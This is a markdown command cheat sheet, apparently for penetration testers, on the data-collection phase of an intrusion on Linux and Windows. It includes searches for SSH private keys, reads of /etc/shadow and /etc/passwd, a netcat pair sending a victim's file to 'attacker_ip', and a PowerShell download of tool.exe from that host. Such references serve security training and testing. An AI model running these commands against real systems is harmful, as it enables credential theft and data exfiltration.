# Collection - File System Operations & Data Manipulation

File-system commands for Linux/Unix and Windows — data collection, staging, transfer.

## Linux/Unix Commands

### Find Sensitive Files

* **Find SSH private keys:**

    ```bash
    find / -name "id_rsa" 2>/dev/null
    ```

* **Find configuration or log files:**

    ```bash
    find / -name "*.conf" -o -name "*.log" 2>/dev/null
    ```

* **Find world-writable files:**

    ```bash
    find / -type f -perm /0002 2>/dev/null # World-writable files
    ```

### Read Files

* **Read `/etc/passwd` (user accounts):**

    ```bash
    cat /etc/passwd
    ```

* **Read `/var/log/auth.log` (authentication logs):**

    ```bash
    less /var/log/auth.log
    ```

* **Read first 10 lines of `/etc/shadow` (hashed passwords - requires root):**

    ```bash
    head -n 10 /etc/shadow
    ```

* **Read last 20 lines of `/var/log/syslog` (system logs):**

    ```bash
    tail -n 20 /var/log/syslog
    ```

### Write/Append to Files

* **Overwrite file content:**

    ```bash
    echo "malicious content" > file.txt
    ```

* **Append to file content:**

    ```bash
    echo "more content" >> file.txt
    ```

### Transfer Files (Netcat)

* **Listener (Attacker):** Set up a listener to receive a file.

    ```bash
    nc -lvnp 1234 > received_file.txt
    ```

* **Sender (Victim):** Send a file to the attacker.

    ```bash
    nc attacker_ip 1234 < file_to_send.txt
    ```

### Process Management (Linux)

* **List processes and filter by name:**

    ```bash
    ps aux | grep <process_name>
    ```

* **Kill a process by PID:**

    ```bash
    kill <pid>
    ```

## Windows Commands (cmd.exe / PowerShell)

### List Directory Contents

* **List contents of a directory:**

    ```cmd
    dir C:\Users\Public
    ```

### Read File Content

* **Read content of a text file:**

    ```cmd
    type C:\Windows\System32\drivers\etc\hosts
    ```

### Find Files

* **Find all `.txt` files in `C:\Users` and its subdirectories:**

    ```cmd
    dir /s /b C:\Users\*.txt
    ```

### Network Configuration

* **Display all network configuration details:**

    ```cmd
    ipconfig /all
    ```

* **Display active network connections and listening ports:**

    ```cmd
    netstat -ano
    ```

### Firewall Rules

* **Show all firewall rules:**

    ```cmd
    netsh advfirewall firewall show rule name=all
    ```

### Process Management

* **List all running processes:**

    ```cmd
    tasklist
    ```

* **Terminate a process by PID:**

    ```cmd
    taskkill /PID <pid> /F
    ```

### PowerShell Web Download

* **Download a file from a URL:**

    ```powershell
    Invoke-WebRequest -Uri http://attacker_ip/tool.exe -OutFile C:\tool.exe
    ```
